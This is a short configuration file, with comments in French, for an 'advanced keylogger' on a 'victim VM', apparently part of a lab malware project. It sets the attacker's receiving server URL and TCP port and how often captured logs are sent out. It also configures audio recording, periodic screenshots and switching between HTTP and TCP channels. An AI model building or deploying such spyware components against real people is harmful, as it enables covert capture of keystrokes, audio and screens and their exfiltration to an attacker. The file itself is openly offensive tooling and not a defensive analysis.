# Fichier de configuration pour le Keylogger Avancé (VM Victime)

# --- CONFIGURATION DU SERVEUR DE RÉCEPTION ---
# IP de la machine attaquante. Utilisez l'IP de la VM attaquante.
# NOTE : En mode Réseau Interne VirtualBox, l'IP ne sera PAS 127.0.0.1.
# Remplacez 127.0.0.1 par l'adresse réelle de la VM Attaquante (ex: "http://192.168.56.101:5000/log")
SERVER_URL = "http://127.0.0.1:5000/log"

# Port pour la communication Socket TCP (si le mode TCP est activé)
TCP_PORT = 5001

# Fréquence d'envoi des logs vers le serveur (en secondes)
SEND_INTERVAL = 5


# --- CONFIGURATION DES CAPTURES ---

# 1. Configuration Audio
# Durée de chaque clip audio enregistré avant l'enregistrement de l'événement (en secondes)
AUDIO_RECORD_SECONDS = 5
# Taux d'échantillonnage standard (Hz)
AUDIO_RATE = 44100

# 2. Configuration Screenshot
# Intervalle entre les captures d'écran (en secondes). Attention au volume de données!
SCREENSHOT_INTERVAL = 15


# --- CONFIGURATION DU MODE DE COMMUNICATION ---
# Mode de communication actif au démarrage. Utilisé pour la résilience et la commande switch_mode.
# Valeurs possibles : "http" ou "tcp"
INITIAL_COMM_MODE = "http"